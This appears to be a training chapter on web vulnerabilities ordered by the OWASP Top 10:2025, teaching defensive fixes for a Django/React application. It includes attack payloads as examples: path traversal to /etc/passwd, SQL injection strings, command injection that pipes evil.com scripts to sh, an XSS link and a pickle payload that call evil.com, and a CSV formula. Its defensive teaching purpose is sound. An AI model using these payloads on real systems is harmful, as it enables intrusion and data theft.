# Web Vulnerabilities — Zero to Professional

**Week 20.** By the end of this file you can find and fix every category on the OWASP Top
10:2025, write the exploit that proves each one, and explain why the structural fix is
structural rather than a patch.

Built on the **OWASP Top 10:2025**, verified October 2026 against `top10.owasp.org/2025`.
If you have older notes that teach the 2021 list, they are out of date in ways that
matter: two categories are new, one was merged away, and the ordering changed
substantially.

---

## Table of Contents

1. [Before you read a word](#before-you-read-a-word)
2. [Chapter 1: A01 — Broken Access Control](#chapter-1-a01--broken-access-control)
3. [Chapter 2: A02 — Security Misconfiguration](#chapter-2-a02--security-misconfiguration)
4. [Chapter 3: A03 — Software Supply Chain Failures](#chapter-3-a03--software-supply-chain-failures)
5. [Chapter 4: A04 — Cryptographic Failures](#chapter-4-a04--cryptographic-failures)
6. [Chapter 5: A05 — Injection](#chapter-5-a05--injection)
7. [Chapter 6: A06 — Insecure Design](#chapter-6-a06--insecure-design)
8. [Chapter 7: A07 — Authentication Failures](#chapter-7-a07--authentication-failures)
9. [Chapter 8: A08 — Software or Data Integrity Failures](#chapter-8-a08--software-or-data-integrity-failures)
10. [Chapter 9: A09 — Security Logging and Alerting Failures](#chapter-9-a09--security-logging-and-alerting-failures)
11. [Chapter 10: A10 — Mishandling of Exceptional Conditions](#chapter-10-a10--mishandling-of-exceptional-conditions)
12. [Chapter 11: CSRF](#chapter-11-csrf)
13. [Chapter 12: File upload](#chapter-12-file-upload)
14. [Chapter 13: Security headers reference](#chapter-13-security-headers-reference)
15. [Chapter 14: Rate limiting and application DoS](#chapter-14-rate-limiting-and-application-dos)
16. [Chapter 15: Client-side attacks](#chapter-15-client-side-attacks)
17. [Chapter 16: Finding these yourself](#chapter-16-finding-these-yourself)
18. [Chapter 17: The catalogue](#chapter-17-the-catalogue)
19. [Chapter 18: The checklist](#chapter-18-the-checklist)
20. [Exercise 5 — the module checkpoint](#exercise-5--the-module-checkpoint)

---

## Before you read a word

### What changed in 2025, and why you should care

| 2025 | Category | Change from 2021 |
|---|---|---|
| **A01** | Broken Access Control | stayed #1; **SSRF merged in** |
| **A02** | Security Misconfiguration | **rose from #5** |
| **A03** | **Software Supply Chain Failures** | **NEW** — expands "Vulnerable and Outdated Components" |
| **A04** | Cryptographic Failures | fell from #2 |
| **A05** | Injection | **fell from #3** |
| **A06** | Insecure Design | fell from #4 |
| **A07** | Authentication Failures | renamed from "Identification and Authentication Failures" |
| **A08** | Software or Data Integrity Failures | unchanged at #8 |
| **A09** | Security Logging & **Alerting** Failures | renamed from "Monitoring" |
| **A10** | **Mishandling of Exceptional Conditions** | **NEW** |

The methodology, because it tells you how to read the list: contributed data on over **2.8
million applications**, covering 589 CWEs, with the ten categories containing 248 of them.
Exploitability and impact came from roughly 175,000 CVE-to-CWE records. Two categories —
A03 and A09 — were chosen by community survey rather than by the data, because they are
things practitioners see that scanners do not measure.

Three observations worth more than memorising the order:

**Injection fell from #3 to #5.** Not because injection stopped mattering, but because
frameworks fixed it by default. Parameterised queries and auto-escaping templates removed
the *class*, exactly as `../00-foundations/01-SECURITY_FOUNDATIONS.md` Chapter 1 argued
structural controls do. That is what success looks like in this field.

**Misconfiguration rose to #2.** As code got safer, deployment got more complicated. The
bugs moved from the application to its configuration.

**A10 is new and is the most interesting addition.** "Mishandling of Exceptional
Conditions" means failing open, swallowing errors, leaking detail in error messages, and
inconsistent state after a partial failure. It is the recognition that **what your system
does when something goes wrong is a security property.**

---

# PART 1 — THE TOP TEN

## Chapter 1: A01 — Broken Access Control

#1 in both 2021 and 2025, present in **3.73%** of tested applications.

The authorisation models, the central-policy pattern, IDOR, mass assignment, CORS and the
test suite are covered in depth in
[`01-AUTHENTICATION_AND_ACCESS_CONTROL.md`](01-AUTHENTICATION_AND_ACCESS_CONTROL.md)
Chapters 6–8. This chapter covers the parts of A01 that are specifically about *resources*
rather than *objects*, plus the SSRF merge.

### Path traversal

```python
# Purpose: WRONG. The user controls part of a filesystem path, so ../ escapes the
# intended directory.
def download(request):
    name = request.GET["file"]
    return FileResponse(open(f"/var/app/reports/{name}", "rb"))

#   ?file=../../../../etc/passwd
#   ?file=..%2f..%2f..%2fetc%2fpasswd          URL-encoded
#   ?file=....//....//etc/passwd               doubled, defeats a naive strip of "../"
#   ?file=/etc/passwd                          absolute path wins in some joins
#   ?file=....\\....\\windows\\win.ini         Windows separators
```

```python
# Purpose: RIGHT. Resolve the final path and verify it is inside the intended
# directory. Never inspect the input string - inspect the RESULT.
from pathlib import Path

REPORTS = Path("/var/app/reports").resolve()

def safe_path(user_input: str) -> Path:
    candidate = (REPORTS / user_input).resolve()
    if not candidate.is_relative_to(REPORTS):      # Python 3.9+
        raise PermissionDenied("path outside the allowed directory")
    if candidate.is_symlink():
        raise PermissionDenied("symlinks not allowed")
    return candidate
```

```python
# Purpose: BETTER. Do not let the user name a file at all. Look up an ID and read
# the path from the database, so traversal is not expressible.
def download(request, report_id):
    report = get_object_or_404(visible_reports(request.user), pk=report_id)
    return FileResponse(open(report.storage_path, "rb"))
```

The second fix is the structural one, and the pattern generalises: **when user input
selects from a set, pass an identifier, not a path.** The same reasoning applies to
template names, redirect targets, import modules and S3 keys.

### Open redirect

```python
# Purpose: WRONG. An attacker sends a link to YOUR domain that bounces the user to
# theirs, which makes phishing far more convincing.
def post_login(request):
    return redirect(request.GET.get("next", "/"))
#   /login?next=https://imbon1.rw/phish
#   /login?next=//evil.com           protocol-relative; passes a startswith("/") check
#   /login?next=/\evil.com           browsers normalise this to //evil.com

# Purpose: RIGHT. Validate against your own allowed hosts.
from django.utils.http import url_has_allowed_host_and_scheme

def post_login(request):
    nxt = request.GET.get("next", "")
    if url_has_allowed_host_and_scheme(nxt, allowed_hosts={"imboni.rw", "www.imboni.rw"},
                                       require_https=True):
        return redirect(nxt)
    return redirect("/")
```

### Forced browsing

Unlinked does not mean protected. An endpoint with no link in the UI is still reachable.

```bash
# Purpose: find endpoints that exist but are not linked - the ones most likely to
# have no authorisation check because "nobody can get there".
ffuf -u https://imboni.rw/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,403
gobuster dir -u https://imboni.rw -w /usr/share/wordlists/dirb/common.txt -k

# Purpose: the version that matters more - enumerate your OWN routes and check
# each has an authorisation decision.
python manage.py show_urls | grep -v "admin/" | wc -l
```

### SSRF, now part of A01

Covered in full in `../00-foundations/02-NETWORKING_FOR_SECURITY.md` Chapter 16, including
why string blocklists fail and the `safe_fetch` implementation that validates resolved
IPs.

The reason OWASP merged it here is worth understanding: SSRF **is** an access-control
failure. The server is making a request the user is not authorised to make, using the
server's network position as the privilege. Framed that way, the fix is the A01 fix —
authorise the action, do not filter the input.

### Practice

1. Find every place user input reaches a filesystem path, a template name, or a redirect.
2. Test all five traversal payloads against each. Fix with `is_relative_to`, then replace
   with the identifier pattern.
3. Run `ffuf` against your own staging environment. For every 200 or 403 found, check
   whether it has an authorisation decision.

---

## Chapter 2: A02 — Security Misconfiguration

Risen from #5 to #2, in **3.00%** of applications. The category that grows as deployment
gets more complex.

### The checklist that finds most of it

```python
# Purpose: audit the settings that matter most in a Django deployment. Each of
# these has caused real breaches.
# settings.py — production

DEBUG = False                       # the single most important line
ALLOWED_HOSTS = ["imboni.rw", "www.imboni.rw"]      # never ["*"]

SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = False         # effectively permanent; decide deliberately
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_REFERRER_POLICY = "strict-origin-when-cross-origin"
SECURE_CROSS_ORIGIN_OPENER_POLICY = "same-origin"
X_FRAME_OPTIONS = "DENY"

SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
CSRF_TRUSTED_ORIGINS = ["https://imboni.rw"]

# When behind a reverse proxy, this is REQUIRED for request.is_secure() to work —
# and it is only safe because nginx overwrites the header (networking Ch 13).
SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")

ADMINS = [("you", "alerts@imboni.rw")]              # so 500s reach a human
```

```bash
# Purpose: Django's own deployment audit. Run it in CI against production settings
# and fail the build on any warning.
DJANGO_SETTINGS_MODULE=config.settings.production python manage.py check --deploy --fail-level WARNING
```

### Why `DEBUG = True` is catastrophic

Not "leaks a stack trace". It leaks:

- Every setting name and value, **including `SECRET_KEY` and database credentials**, on
  any unhandled exception
- The full installed-apps list and middleware stack
- SQL queries with their parameters
- Local variables at every frame, which routinely include session data and passwords
- Your file paths and Python version

```bash
# Purpose: confirm DEBUG is off in production by triggering a 404 and checking the
# response. A Django debug 404 lists every URL pattern in the project.
curl -s https://imboni.rw/this-does-not-exist-12345 | grep -ci "URLconf\|Django tried\|Traceback"
# 0 is correct. Anything else is an emergency.
```

### Content Security Policy — the header worth real effort

CSP is the one configuration that turns XSS from a breach into a blocked console message.
It is also the one most often deployed in a form that does nothing.

```python
# Purpose: a CSP that actually mitigates XSS. The critical property is NO
# 'unsafe-inline' on script-src - which is also why it requires work: every inline
# script and handler must be removed or given a nonce.
CSP_DEFAULT_SRC = ("'none'",)
CSP_SCRIPT_SRC = ("'self'", "'nonce-{nonce}'")
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", "data:", "https://cdn.imboni.rw")
CSP_CONNECT_SRC = ("'self'",)
CSP_FONT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)          # clickjacking, supersedes X-Frame-Options
CSP_FORM_ACTION = ("'self'",)              # stops a form being retargeted
CSP_BASE_URI = ("'none'",)                 # stops <base> hijacking relative URLs
CSP_OBJECT_SRC = ("'none'",)
CSP_UPGRADE_INSECURE_REQUESTS = True
CSP_REPORT_URI = "/csp-report/"
```

| Directive | Stops |
|---|---|
| `script-src` without `unsafe-inline` | **injected scripts executing** — the main event |
| `object-src 'none'` | Flash/plugin-based bypasses |
| `base-uri 'none'` | `<base href>` injection redirecting every relative URL |
| `form-action 'self'` | an injected form posting credentials elsewhere |
| `frame-ancestors 'none'` | clickjacking |
| `connect-src` | exfiltration via `fetch` from injected code |

```python
# Purpose: the nonce pattern. A per-response random nonce lets YOUR inline scripts
# run while injected ones cannot, because the attacker cannot guess the nonce.
import secrets

class CSPNonceMiddleware:
    def __call__(self, request):
        request.csp_nonce = secrets.token_urlsafe(16)
        response = self.get_response(request)
        response["Content-Security-Policy"] = (
            "default-src 'none'; "
            f"script-src 'self' 'nonce-{request.csp_nonce}'; "
            "style-src 'self'; img-src 'self' data:; connect-src 'self'; "
            "font-src 'self'; frame-ancestors 'none'; form-action 'self'; "
            "base-uri 'none'; object-src 'none'; "
            "report-uri /csp-report/")
        return response
```

```html
<!-- Purpose: the template side. Any inline script without the nonce is blocked. -->
<script nonce="{{ request.csp_nonce }}">
  window.__CONFIG__ = {{ config_json|safe }};
</script>
```

**Deploy it in report-only mode first.** `Content-Security-Policy-Report-Only` sends
violation reports without blocking, so you learn what breaks before you break it.

```python
# Purpose: collect CSP violation reports. These tell you both what your own site
# does wrong AND, once clean, when someone is attempting injection.
@csrf_exempt
@require_POST
def csp_report(request):
    try:
        report = json.loads(request.body)["csp-report"]
    except (ValueError, KeyError):
        return HttpResponse(status=400)
    logger.warning("csp_violation", extra={
        "blocked_uri": report.get("blocked-uri"),
        "violated_directive": report.get("violated-directive"),
        "document_uri": report.get("document-uri"),
    })
    return HttpResponse(status=204)
```

### The rest of the category

| Misconfiguration | Check |
|---|---|
| Default credentials | every service: database, Redis, admin panels, routers |
| Directory listing enabled | `curl https://imboni.rw/static/` |
| Verbose error pages | triggered 404 and 500 |
| Unnecessary features enabled | unused Django apps, unused ports, sample apps |
| Admin reachable from anywhere | restrict by IP or VPN, rename the path |
| Cloud storage public | bucket ACLs and policies |
| Missing security headers | see Chapter 13 |
| Overly permissive CORS | exact origins only |
| Stack traces to the client | generic error pages |
| Unpatched platform | `unattended-upgrades` |

```bash
# Purpose: check the headers a real request receives, which is the fastest way to
# find missing configuration.
curl -sI https://imboni.rw | sort
curl -s https://imboni.rw/static/ | head -5        # directory listing?
curl -sI https://imboni.rw/.env                    # must be 404, not 200
curl -sI https://imboni.rw/.git/config             # must be 404
curl -sI https://imboni.rw/admin/                  # reachable from the internet?
```

The `.git/config` check is not paranoia. An exposed `.git` directory lets anyone
reconstruct your entire source tree, including any secret ever committed — which, per
`../../engineering-curriculum/02-backend/12-REMOVE_COMMITTED_ENV.md`, you have had.

### Practice

1. Run `check --deploy --fail-level WARNING` against production settings. Fix everything.
2. Verify `DEBUG` is off with the 404 test.
3. Deploy CSP in report-only mode. Collect reports for a week, fix your own violations,
   then enforce.
4. Run all five `curl` checks. `.env` and `.git/config` must both be 404.
5. Add the deployment check to CI so it cannot regress.

---

## Chapter 3: A03 — Software Supply Chain Failures

**New in 2025**, at #3, chosen partly by community survey. Covered in full in
[`03-SUPPLY_CHAIN_AND_SECURE_SDLC.md`](03-SUPPLY_CHAIN_AND_SECURE_SDLC.md).

The one-paragraph version, because it is the category most relevant to how *you* were
actually compromised: your dependencies are code you ship and did not read, your build
pipeline is a privileged execution environment, and your development machine is part of
the supply chain for everything you deploy. The September incident was a supply-chain
compromise — the supplier was a cracked-game repack, and the artefact it poisoned was your
credentials.

---

## Chapter 4: A04 — Cryptographic Failures

Fell from #2 to #4, in **3.80%** of applications. The primitives, password hashing, AEAD,
key management and TLS are in `../00-foundations/03-CRYPTOGRAPHY_ESSENTIALS.md`.

The web-specific instances:

| Failure | Web form |
|---|---|
| Data in transit unencrypted | HTTP anywhere, missing HSTS, mixed content |
| Weak password storage | fast hashes, no salt |
| Secrets in the client | API keys in JavaScript bundles |
| Secrets in URLs | tokens in query strings — history, `Referer`, logs |
| Predictable tokens | `random` instead of `secrets`, sequential IDs |
| Sensitive data cached | missing `Cache-Control: no-store` on personal data |
| Encoding mistaken for encryption | base64 "protection" |

```bash
# Purpose: find secrets shipped to the browser. Anything in a JS bundle is public,
# regardless of the variable name.
grep -rniE "api[_-]?key|secret|password|token|sk_live|AKIA" \
     --include="*.js" --include="*.jsx" --include="*.ts" --include="*.tsx" \
     src/ | grep -v "\.test\." | head -20

# Purpose: check the built bundle, which is what users actually receive.
npm run build && grep -riE "sk_live|AKIA|-----BEGIN" dist/ | head
```

```python
# Purpose: prevent sensitive pages being written to disk caches and shared proxies.
# Without this, a child's record can persist in a browser cache on a shared computer.
@never_cache
def student_detail(request, pk):
    response = render(...)
    response["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    response["Pragma"] = "no-cache"
    return response
```

The shared-computer scenario is realistic for Imboni: a parent checks a record at an
internet café, and without `no-store` the page sits in the cache for the next user. It is
a two-line fix for a real disclosure.

---

## Chapter 5: A05 — Injection

Fell to #5 because frameworks fixed it. It still rewards complete understanding, because
the instances that survive are the ones where you stepped outside the framework.

### The one idea

> **Injection is data being interpreted as instructions.**

Every variant is that sentence in a different interpreter. The structural fix is always
the same shape: **keep data and instructions in separate channels** so the interpreter
never parses the data.

| Context | Interpreter | Structural fix |
|---|---|---|
| SQL | the database | parameterised queries |
| HTML | the browser | contextual auto-escaping |
| Shell | `/bin/sh` | argument arrays |
| LDAP / XPath | the directory | parameterised APIs |
| Templates | your template engine | never build templates from input |
| CSV | Excel | prefix formula characters |
| Logs | the log reader | structured logging |
| **LLM prompt** | the model | **no structural fix exists** |

### SQL injection — the full taxonomy

```python
# Purpose: WRONG. String interpolation into SQL. The input becomes part of the
# statement, so an apostrophe changes the query's meaning.
cursor.execute(f"SELECT * FROM students WHERE name = '{name}'")
#   name = "' OR '1'='1"                      → every row
#   name = "'; DROP TABLE students; --"        → if the driver allows multiple statements
#   name = "' UNION SELECT password,1,1 FROM auth_user --"   → data from another table

# Purpose: RIGHT. The statement and the parameters travel separately. The database
# never parses the parameter as SQL, whatever it contains.
cursor.execute("SELECT * FROM students WHERE name = %s", [name])
```

| Type | How it leaks | Detection |
|---|---|---|
| **In-band / error-based** | the error message contains data | verbose database errors |
| **UNION-based** | appended `UNION SELECT` returns extra rows | column-count probing |
| **Blind boolean** | page differs for true and false conditions | `AND 1=1` vs `AND 1=2` |
| **Blind time-based** | `pg_sleep(5)` delays the response | timing |
| **Out-of-band** | the database makes a DNS or HTTP request | external interaction |
| **Second-order** | input stored safely, then used unsafely later | the hard one |

**Second-order is the one that survives code review.** Input is parameterised on the way
in, stored, and then later concatenated into a query by a reporting job that nobody
audited.

```python
# Purpose: a second-order injection. The insert is safe; the later report is not.
Student.objects.create(name=request.POST["name"])      # safe, parameterised

# ... three months later, in a reporting command:
for s in Student.objects.all():
    cursor.execute(f"SELECT COUNT(*) FROM attendance WHERE student_name = '{s.name}'")
    #                                                                      ^^^^^^^^
    # The stored name was never dangerous in the database. It is dangerous HERE.
```

### ORM-specific pitfalls

The ORM protects you until you leave it, and these are the exits:

```python
# Purpose: the Django APIs that accept raw SQL. Each is a legitimate tool and each
# is an injection site if given user input.

# raw() — the whole query is yours
Student.objects.raw(f"SELECT * FROM students WHERE name = '{name}'")      # WRONG
Student.objects.raw("SELECT * FROM students WHERE name = %s", [name])     # right

# extra() — deprecated and dangerous; avoid entirely
Student.objects.extra(where=[f"name = '{name}'"])                         # WRONG

# RawSQL in annotations
Student.objects.annotate(x=RawSQL(f"(SELECT ... WHERE id = {uid})", []))  # WRONG
Student.objects.annotate(x=RawSQL("(SELECT ... WHERE id = %s)", [uid]))   # right

# .filter() with an attacker-controlled FIELD NAME — not SQL injection, but it
# lets a user filter and therefore infer on any field, including a password hash.
Student.objects.filter(**{request.GET["field"]: request.GET["value"]})    # WRONG

# order_by with user input — allows traversing relations to probe other tables
Student.objects.order_by(request.GET["sort"])                            # WRONG
```

```python
# Purpose: RIGHT for dynamic sorting and filtering - an allow-list maps safe public
# names to fields you have chosen to expose.
SORTABLE = {"name": "last_name", "class": "class_group__name", "date": "enrolled_at"}

def student_list(request):
    key = request.GET.get("sort", "name")
    field = SORTABLE.get(key, "last_name")
    direction = "-" if request.GET.get("desc") == "1" else ""
    return visible_students(request.user).order_by(f"{direction}{field}")
```

```bash
# Purpose: find every raw SQL exit in the codebase and review each one by hand.
grep -rn "\.raw(\|\.extra(\|RawSQL\|cursor.execute\|connection.cursor" \
     --include="*.py" . | grep -v migrations | grep -v test
```

```bash
# Purpose: test your OWN application for SQL injection. sqlmap is the standard
# tool; run it against staging, never against someone else's system.
sqlmap -u "https://staging.imboni.rw/api/students/?search=test" \
       --cookie="sessionid=..." --batch --level=2 --risk=1
```

### Command injection

```python
# Purpose: WRONG. shell=True means a shell parses the string, so metacharacters in
# the filename become commands.
subprocess.run(f"convert {filename} -resize 200x200 out.jpg", shell=True)
#   filename = "x.jpg; curl evil.com/s.sh | sh"
#   filename = "x.jpg && cat /etc/passwd"
#   filename = "$(cat .env)"

# Purpose: RIGHT. An argument list goes to execve directly. No shell, so shell
# metacharacters are inert bytes.
subprocess.run(["convert", filename, "-resize", "200x200", "out.jpg"],
               check=True, timeout=30, shell=False)

# Purpose: BETTER. Use a library and never invoke a subprocess at all.
from PIL import Image
Image.open(filename).resize((200, 200)).save("out.jpg")
```

One subtlety worth knowing: even with an argument list, a filename beginning with `-` can
be read as an **option** by the program you call. Pass `--` where the tool supports it, or
validate that the argument does not start with a hyphen.

### Cross-site scripting

XSS is injection into HTML. Three kinds, with different root causes:

| Kind | Where the payload lives | Example |
|---|---|---|
| **Reflected** | in the request, echoed into the response | `?q=<script>…` |
| **Stored** | in your database, served to every viewer | a comment field |
| **DOM-based** | never reaches the server; JavaScript writes it | `location.hash` into `innerHTML` |

Stored is the worst — one injection, every viewer, including admins. DOM-based is the
hardest to find, because server-side scanning never sees it.

**The context determines the escape.** This is the part people miss:

```html
<!-- Purpose: the same value needs DIFFERENT escaping in each of these positions.
     HTML escaping is correct in only the first. -->

<div>{{ value }}</div>                       <!-- HTML context:    escape & < > " ' -->
<div title="{{ value }}">                    <!-- attribute:       same, quotes required -->
<script>var x = {{ value }};</script>        <!-- JavaScript:      JSON-encode, NOT HTML-escape -->
<a href="{{ value }}">                       <!-- URL:             validate scheme; javascript: is executable -->
<style>a { color: {{ value }} }</style>      <!-- CSS:             CSS-escape -->
```

```html
<!-- Purpose: WRONG. HTML-escaping inside a script block produces broken or
     exploitable JavaScript, because &quot; is not a JS string delimiter. -->
<script>var name = "{{ user.name }}";</script>

<!-- Purpose: RIGHT. json_script emits a typed, correctly escaped JSON payload in
     a script tag the browser will not execute. -->
{{ user_data|json_script:"user-data" }}
<script nonce="{{ request.csp_nonce }}">
  const userData = JSON.parse(document.getElementById("user-data").textContent);
</script>
```

```html
<!-- Purpose: the javascript: scheme in an href is script execution, and HTML
     escaping does not stop it. Validate the scheme. -->
<a href="{{ profile_url }}">link</a>
<!-- profile_url = "javascript:fetch('/api/me').then(r=>r.json()).then(d=>
     fetch('https://evil.com?d='+btoa(JSON.stringify(d))))" -->
```

### XSS in React

React escapes by default, which removes most XSS — and there are exactly four ways back
in:

```jsx
// Purpose: the four XSS routes in a React application. Grep for all four.

// 1. dangerouslySetInnerHTML - the name is the warning
<div dangerouslySetInnerHTML={{ __html: userContent }} />        // WRONG

// 2. a user-controlled href or src
<a href={userUrl}>link</a>                                       // javascript: executes

// 3. a user-controlled component or prop spread
<Component {...userControlledProps} />                           // can inject handlers

// 4. direct DOM access escaping React entirely
useEffect(() => { ref.current.innerHTML = userContent; }, []);    // WRONG
```

```jsx
// Purpose: RIGHT. If you must render user HTML, sanitise it with a maintained
// library and an explicit allow-list. Never with a regex.
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(userContent, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br", "ul", "ol", "li", "a"],
  ALLOWED_ATTR: ["href", "title"],
  ALLOWED_URI_REGEXP: /^https?:\/\//i,         // no javascript:, no data:
});
<div dangerouslySetInnerHTML={{ __html: clean }} />

// Purpose: RIGHT for links - validate the scheme before rendering.
const safeHref = (url) => {
  try {
    const u = new URL(url, window.location.origin);
    return ["http:", "https:", "mailto:"].includes(u.protocol) ? u.href : "#";
  } catch { return "#"; }
};
```

```bash
# Purpose: find all four React XSS routes.
grep -rn "dangerouslySetInnerHTML\|innerHTML\s*=\|outerHTML\s*=\|insertAdjacentHTML" \
     --include="*.jsx" --include="*.tsx" --include="*.js" src/
```

### Advanced: mutation XSS

A sanitiser and the browser's HTML parser can disagree. The sanitiser sees safe markup;
the browser *re-parses* it after insertion and produces something different — and
dangerous. This has repeatedly broken sanitisers that looked correct.

The consequences for your design:

- **Use a maintained sanitiser and keep it updated.** Mutation XSS bypasses are found
  regularly and fixed upstream. A sanitiser you wrote is a sanitiser nobody is fixing.
- **Sanitise on output, in the browser, immediately before insertion** — not on input,
  where storage and later transformation can change the bytes.
- **Rely on CSP as the backstop**, because it blocks execution regardless of how the
  payload got there. This is why Chapter 2's CSP work is the highest-value XSS mitigation
  you can deploy.

### Server-side template injection

```python
# Purpose: WRONG. Building a template from user input means the user writes
# template code, which runs on your server with your privileges.
from django.template import Template, Context
Template(f"Hello {user_input}").render(Context({}))
#   user_input = "{{ settings.SECRET_KEY }}"
#   In Jinja2, which allows attribute access, this reaches code execution.

# Purpose: RIGHT. The template is a constant; user data is passed as context and
# is never parsed as template syntax.
Template("Hello {{ name }}").render(Context({"name": user_input}))
```

This arises wherever users customise messages — email templates, report headers,
notification text. The rule is absolute: **user data is context, never template.**

### The ones people forget

```python
# Purpose: CSV formula injection. A spreadsheet executes cell contents starting
# with = + - @ or tab, so an exported "name" can run a command on the recipient's
# machine when a teacher opens the file.
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def csv_safe(value) -> str:
    s = "" if value is None else str(value)
    return "'" + s if s.startswith(DANGEROUS_PREFIXES) else s

# Purpose: log injection. A newline in user input forges log entries, which
# corrupts the evidence you will need during an incident.
logger.info("login failed for %s", email)          # WRONG if email has \n
logger.info("login_failed", extra={"email": email})   # structured: no parsing

# Purpose: header injection / response splitting. A newline in a header value
# injects additional headers or a whole second response.
response["X-Custom"] = user_value.replace("\r", "").replace("\n", "")
```

CSV injection is the one that matters most in your context, because the people who open
those exports are teachers on Windows machines, and the payload runs as them.

### Prompt injection

The open problem. Covered in
`../../data-science-ml/05-nlp-llms/06-LLM_SECURITY.md`. The structural point for this
file:

> An LLM has **one channel** for instructions and data. There is no parameterisation, so
> there is no structural fix. Every mitigation is probabilistic.

Which forces a design conclusion rather than a code fix: **an LLM's output is untrusted
input to whatever consumes it**, and an LLM must never hold a privilege you would not give
to the author of its input.

### Practice

1. Run the raw-SQL grep. Review every hit by hand.
2. Find one second-order injection risk: a field stored safely and later used in a raw
   query or an export.
3. Run `sqlmap` against your own staging API.
4. Run the React XSS grep. For every `dangerouslySetInnerHTML`, either remove it or add
   DOMPurify with an allow-list.
5. Test the five HTML contexts with the same payload. Confirm your templates escape each
   correctly, especially inside `<script>`.
6. Export a CSV with a name of `=cmd|' /c calc'!A1` and open it. Then fix it.
7. Find a `shell=True` and replace it with an argument list.

---

## Chapter 6: A06 — Insecure Design

The category that cannot be fixed by scanning, because the code is correct and the
*design* is wrong.

### Business logic flaws

Every request is valid; the sequence is not. The abuse-case technique from
`../00-foundations/01-SECURITY_FOUNDATIONS.md` Chapter 7 is how you find these.

```
Sequence:  add to cart → apply discount → remove item → discount persists
Numeric:   quantity = -1 → a refund
Timing:    cancel after delivery, inside the refund window
Identity:  change email to the victim's, then trigger a password reset
Workflow:  submit attendance for a past date, after reports were generated
Quota:     one free trial per email → unlimited via user+1@gmail.com
Race:      redeem one invitation twice simultaneously
```

Three to test in Imboni today:

```python
# Purpose: a state machine that makes invalid transitions impossible, rather than
# checking for them in each view. The design fix, not the patch.
TRANSITIONS = {
    "draft":     {"submitted"},
    "submitted": {"approved", "rejected"},
    "approved":  {"archived"},
    "rejected":  {"draft"},
    "archived":  set(),
}

def transition(obj, new_state: str, actor) -> None:
    if new_state not in TRANSITIONS[obj.state]:
        raise InvalidTransition(f"{obj.state} → {new_state} is not allowed")
    if not can_transition(actor, obj, new_state):
        raise PermissionDenied
    with transaction.atomic():
        updated = type(obj).objects.filter(pk=obj.pk, state=obj.state) \
                                   .update(state=new_state)
        if updated != 1:
            raise ConcurrentModification        # someone else moved it first
        AccessLog.objects.create(actor=actor, action=f"transition:{new_state}",
                                 object_type=type(obj).__name__, object_id=obj.pk)
```

That `filter(state=obj.state).update(...)` is optimistic concurrency control, and it is
what makes the state machine safe under simultaneous requests — the TOCTOU fix from
`../00-foundations/01-SECURITY_FOUNDATIONS.md` Chapter 14 applied to workflow.

### Insecure design in the small

| Design flaw | Better design |
|---|---|
| Sequential IDs in URLs | UUIDs, or at least non-guessable public identifiers |
| Unlimited export endpoints | pagination, rate limits, async with a notification |
| Soft delete only | real deletion path, for the legal right to erasure |
| No data retention limit | a retention policy enforced by a scheduled job |
| Collecting optional sensitive fields | do not collect them |
| One role per user | relationships, with validity periods |
| Trusting a client-supplied price or total | recompute server-side, always |

The last row is the classic. Never accept a total, a price, a discount or a quantity's
consequence from the client. Accept identifiers and recompute.

### Practice

1. Write abuse cases for your next three user stories.
2. Test all seven abuse patterns above against Imboni. Report which worked.
3. Replace one sequence of `if` checks with an explicit state machine and optimistic
   concurrency.
4. Find one field you collect and do not use. Delete it.

---

## Chapter 7: A07 — Authentication Failures

Renamed, still #7. Covered in full in
[`01-AUTHENTICATION_AND_ACCESS_CONTROL.md`](01-AUTHENTICATION_AND_ACCESS_CONTROL.md)
Chapters 2–5: password policy, breached-password checks, enumeration, multi-dimensional
rate limiting, MFA, TOTP replay, WebAuthn, recovery codes, step-up authentication,
sessions, and OAuth/OIDC.

---

## Chapter 8: A08 — Software or Data Integrity Failures

Trusting data or code whose integrity you have not verified.

### Insecure deserialisation

```python
# Purpose: WRONG. pickle executes code during loading, by design. Unpickling
# untrusted bytes is arbitrary code execution, not a parsing risk.
import pickle
data = pickle.loads(request.body)              # REMOTE CODE EXECUTION

# A payload is this small:
#   class E:
#       def __reduce__(self):
#           return (os.system, ("curl evil.com/s.sh | sh",))
#   pickle.dumps(E())

# Purpose: RIGHT. A data format that describes data and cannot describe code.
import json
data = json.loads(request.body)
```

```bash
# Purpose: find every dangerous deserialisation site. All of these can execute
# code from their input.
grep -rn "pickle.load\|pickle.loads\|yaml.load(\|marshal.load\|dill.load\|\
jsonpickle\|shelve.open" --include="*.py" . | grep -v test
```

Two that hide in ordinary code:

```python
# Purpose: yaml.load without a safe loader constructs arbitrary Python objects.
yaml.load(user_input)                      # WRONG (unless Loader=SafeLoader)
yaml.safe_load(user_input)                 # right

# Purpose: Celery with the pickle serialiser means anyone who can write to your
# broker gets code execution on every worker. A Redis with no password plus
# pickle is a complete compromise.
CELERY_TASK_SERIALIZER = "json"            # right
CELERY_ACCEPT_CONTENT = ["json"]           # right - reject pickle explicitly
CELERY_RESULT_SERIALIZER = "json"
```

That Celery setting connects directly to the SSRF chapter in the networking file: an
unauthenticated Redis reachable via SSRF, plus a pickle serialiser, is remote code
execution on your workers. Two individually-mild misconfigurations compose into the worst
outcome, which is the general lesson of this category.

### Integrity of code and data you receive

| Risk | Control |
|---|---|
| Dependency tampering | lockfiles with hashes — `pip install --require-hashes` |
| Unsigned CI artefacts | sign builds; verify before deploy |
| CDN script compromise | Subresource Integrity |
| Auto-update without verification | signed updates only |
| Unverified webhooks | HMAC verification (crypto Ch 4) |
| Client-side validation trusted | revalidate server-side |

```html
<!-- Purpose: Subresource Integrity. The browser refuses the script if its hash
     does not match, so a compromised CDN cannot serve different code. -->
<script src="https://cdn.example.com/lib@1.2.3/lib.min.js"
